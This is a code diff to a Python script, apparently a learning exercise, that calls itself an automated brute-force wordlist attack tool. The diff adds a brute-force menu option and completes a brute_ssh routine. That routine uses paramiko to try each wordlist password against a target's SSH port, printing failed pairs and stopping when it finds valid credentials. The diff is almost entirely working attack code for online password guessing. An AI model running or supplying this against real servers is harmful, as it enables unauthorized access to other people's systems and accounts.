@@ -14,8 +14,7 @@ import paramiko, sys, socket
 
 ###########################################
 #
-global host, username, line, input_file
-line = ""*" * 50 "
+
 ###########################################
 #
 # Functions:
@@ -23,7 +22,8 @@ line = ""*" * 50 "
 def main_menu():
     print("[1.] Offensive - Dictionary Iterator")
     print("[2.] Defensive - Password Recongnized")
-    print("[3.] Quit")
+    print("[3.] Brute Force")
+    print("[4.] Quit")
 
     user_input = input(
         "Welcome to Automated Brute Force Wordlist Attack Tool please select method above:")
@@ -33,6 +33,8 @@ def main_menu():
     elif user_input == "2":
         checkpass()
     elif user_input == "3":
+        brute_ssh()
+    elif user_input == "4":
         exit
     else:
         print("Error, make another selection")
@@ -71,10 +73,11 @@ def ssh_connect(hostName, userName, PassWord, int=0):
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
 
     try:
-        ssh.connect(hostName, port=22, username=userName, password=PassWord)
+        ssh.connect(hostname=hostName, port=22, username=userName, password=PassWord)
 
     except paramiko.AuthenticationException:
         int = 1 
+        print(f"Invalid credentials for {userName} : {PassWord}")
     except socket.error as e:
         int = 2
     ssh.close()
@@ -91,29 +94,24 @@ def brute_ssh():
             brute = ssh_connect(hostName,userName, pword)
 
             if brute == 0:
-                print("Valid Login {Username: ")
-        f .close()
-            else:
-                print("^" * 10 + "No file exists" + "^" * 10) 
-
-      #  if os.path.exists(file) == False:
-     #       print("^" * 10 + "The dictionary list is not located here" + "^" * 10)
-      #      sys.exit(4)
-    
-       #elif KeyboardInterrupt:
-      #     print("^" * 10 + "Script Interrupted - Closed" + "^" * 10)
-    #    elif 
-
-
-      #  try:
+                print("^" * 10 +"Valid Login Credentials: " + "Username: " + str(userName) + "Password: " + str(pword) + "^" * 10)
+                break    
+            elif brute == 1:
+                print("^" * 10 + "Invalid Login" + "^" * 10)
+            elif brute == 2:
+                print("^" * 10 + "Connection could not be made" + "^" * 10) 
+                sys.exit(2)
+        f.close()
+     
       
 # Main:
 main_menu()
 #####################################################################
 
-# Source(s): https://github.com/rietesh/Brute-forcer-in-python/blob/master/brute-forcer.py
+# Re-source(s): https://github.com/rietesh/Brute-forcer-in-python/blob/master/brute-forcer.py
 # https://docs.python.org/3/library/itertools.html
 # https://www.w3schools.com/python/python_ref_file.asp
 # https://stackoverflow.com/questions/19699367/for-line-in-results-in-unicodedecodeerror-utf-8-codec-cant-decode-byte
+# https://www.thepythoncode.com/article/brute-force-ssh-servers-using-paramiko-in-python
 
-# Enc
+# End
